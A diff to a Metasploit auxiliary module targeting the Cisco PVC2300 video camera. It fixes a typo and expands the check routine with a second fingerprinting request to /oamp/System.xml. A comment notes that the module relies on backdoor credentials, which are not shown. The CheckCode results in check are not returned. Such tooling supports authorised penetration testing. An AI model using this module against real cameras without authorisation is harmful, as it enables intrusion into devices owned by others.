@@ -62,7 +62,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def request_session_id
-    vprint_status('Attempting to obain a session ID')
+    vprint_status('Attempting to obtain a session ID')
     # the creds used here are basically a backdoor
     res = send_request_cgi({
       'method' => 'GET',
@@ -202,14 +202,23 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def check
-    res = send_request_cgi('uri' => normalize_uri(target_uri.path))
+    res1 = send_request_cgi('uri' => normalize_uri(target_uri.path))
 
-    unless res
+    unless res1
       Exploit::CheckCode::Unknown('Target is unreachable.')
     end
 
     # string togetether a few checks to make it more likely we're dealing with a Cisco camera
-    unless res.code == 401 && res.headers.include?('WWW-Authenticate') && res.headers['WWW-Authenticate'] == 'Basic realm="IP Camera"'
+    unless res1.code == 401 && res1.headers.include?('WWW-Authenticate') && res1.headers['WWW-Authenticate'] == 'Basic realm="IP Camera"'
+      Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')
+    end
+
+    res2 = send_request_cgi('uri' => normalize_uri(target_uri.path, 'oamp', 'System.xml'))
+    unless res2
+      Exploit::CheckCode::Unknown('Target is unreachable.')
+    end
+
+    unless res2.code == 200 && res2.body =~ %r{<ActionStatus><statusCode>.*?</statusCode><statusString>.*?</statusString></ActionStatus>}
       Exploit::CheckCode::Safe('Target is not a Cisco PVC2300 POE Video Camera')
     end
 
